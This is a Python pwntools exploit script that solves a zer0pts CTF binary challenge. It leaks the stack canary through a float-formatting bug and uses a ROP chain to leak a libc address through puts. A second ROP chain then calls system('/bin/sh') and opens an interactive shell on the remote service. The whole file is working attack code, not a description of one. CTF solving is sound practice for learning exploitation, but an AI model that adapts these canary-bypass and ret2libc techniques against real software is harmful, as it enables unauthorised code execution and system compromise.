#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.ctf.zer0pts.com --port 9002 ./chall
from pwn import *
from decimal import Decimal
import struct
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.ctf.zer0pts.com'
port = int(args.PORT or 9002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x400bdd
b *0x000000000040097c
b *0x00000000004009b8
b *0x0000000000400917
b *0x000000000040089b
b *0x400c9c
continue
c
c
c
c
c

'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

pd = lambda x: Decimal(struct.unpack("<d",struct.pack("<Q",int(x) ) )[0])
ud = lambda x: int(struct.unpack("<Q",struct.pack('<d',float(x) ) )[0])

io = start()

if args.LOCAL :
    libc = exe.libc
else:
    libc = ELF("libc.so.6")
pop_rdi = 0x0000000000400e93
pop_rsi = 0x0000000000400e91
p= "a"*8
io.sendlineafter("> ",p)

p= "16"
io.sendlineafter("> ",p)

p= '+'

io.sendlineafter("Time[sec]: ",str(p))
txt = io.recvline()
print txt
# p = re.compile(regex)
# print (p)
# r = p.search(txt)
# print (r)
# x = r.groups()
# temp = x[0]
# print temp
regex = "to (\-*\d+\.\d+) seconds"
x = re.findall(regex, txt)
print x
canary = ud(x[0])
io.send("\n\n")
if float(x[0]) == 0.0:
    print "Bad luck!"
    exit(1)
assert canary & 0xff == 0
print hex(canary)


p = 'a'*0x18
p += p64(canary)
p += p64(0)
p += p64(pop_rdi)
p += p64(0x0000000000601ff0)
p += p64(exe.plt["puts"])
p += p64(exe.sym["ask_again"])

assert '\n' not in p
assert ' ' not in p
io.sendlineafter("(Y/n) ", p)
leak = (io.recvline()[:-1]).ljust(8,"\x00")
libc.address = u64(leak) - libc.sym["__libc_start_main"]
print hex(libc.address)

p = 'a'*0x18
p += p64(canary)
p += p64(0)
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rsi)
p += p64(0)*2
p += p64(libc.sym["system"])
io.sendlineafter("(Y/n) ", p)
# io.recvuntil("Stop the timer as close to 1111111111111111")


io.interactive()
